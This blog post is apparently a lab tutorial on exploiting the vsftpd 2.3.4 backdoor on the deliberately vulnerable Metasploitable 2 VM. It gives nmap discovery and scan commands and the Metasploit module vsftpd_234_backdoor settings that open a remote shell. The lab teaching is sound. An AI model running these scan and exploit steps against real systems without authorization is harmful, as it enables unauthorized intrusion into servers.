---

title: "Exploiting vsftpd 2.3.4 on Metasploitable 2 using Metasploit" classes: wide header: teaser: /assets/images/metasploit/logo.png overlay\_image: /assets/images/metasploit/logo.png overlay\_filter: 0.5 ribbon: Red excerpt: "A step-by-step guide to exploiting the vsftpd 2.3.4 backdoor on Metasploitable 2 using Kali Linux and Metasploit." description: "A step-by-step guide to exploiting the vsftpd 2.3.4 backdoor on Metasploitable 2 using Kali Linux and Metasploit." categories:

- Exploitation
- Penetration Testing tags:
- Metasploit
- Ethical Hacking
- Nmap
- Cybersecurity toc: true toc\_sticky: true toc\_label: "On This Blog" toc\_icon: "biohazard"

---

# Intro

In this post, I’ll show how to **find, analyze, and exploit a vulnerability in vsftpd 2.3.4** (an old FTP server with a backdoor) using **Kali Linux** and **Metasploitable 2**. This tutorial is for **educational purposes only** and should only be used in a controlled lab environment. Never test without permission.

---

## **🔍 Step 1: Find the Target’s IP**

First, we need to identify the IP address of our **Metasploitable 2** machine. Run:

```bash
ip a  # On Linux
ifconfig  # Alternative command
```

On **Kali**, use:

```bash
nmap -sn 192.168.93.0/24
```

This will **list all devices** on the network, helping us locate Metasploitable 2 (e.g., **192.168.93.129**).

---

## **🔎 Step 2: Scan for Open Ports**

Once we have the target's IP, let’s **scan for open services**:

```bash
nmap -sV -p- 192.168.93.129
```

🔹 `-sV`: Detects service versions\
🔹 `-p-`: Scans **all** 65,535 ports

🚀 **Result:** Port **21 (FTP)** is open, running **vsftpd 2.3.4**, which is known to have a **backdoor**.

---

## **📌 Step 3: Exploit vsftpd 2.3.4**

Now, we use **Metasploit** to exploit the vulnerable service:

```bash
msfconsole
```

Select the exploit:

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

Check the required options:

```bash
show options
```

Set the **target IP (RHOSTS)** and the **target port (RPORT)**:

```bash
set RHOSTS 192.168.93.129
set RPORT 21
```

Run the exploit:

```bash
exploit
```

If successful, this gives us a **remote shell** on the target! 🎯

---

## **🖥️ Step 4: What Can We Do With the Shell?**

Now that we have access, we can: ✔️ List files: `ls`\
✔️ Check users: `whoami`\
✔️ Read system info: `uname -a`

This is a basic **proof of concept (PoC)** of how an attacker can exploit outdated services.

---

## **⚠️ Ethical Hacking Reminder**

🔹 This tutorial is **for educational purposes only**.\
🔹 Always have **explicit permission** before testing security.\
🔹 Keep your systems **updated** to avoid these vulnerabilities.

---

## **📚 More Resources**

🔗 Metasploitable 2: [https://sourceforge.net/projects/metasploitable/](https://sourceforge.net/projects/metasploitable/)\
🔗 Metasploit Docs: [https://docs.metasploit.com/](https://docs.metasploit.com/)\
🔗 Nmap: [https://nmap.org/](https://nmap.org/)

Would you like to see more tutorials like this? Let me know in the comments! 🚀🔍 #CyberSecurity #EthicalHacking #Metasploit #PenTesting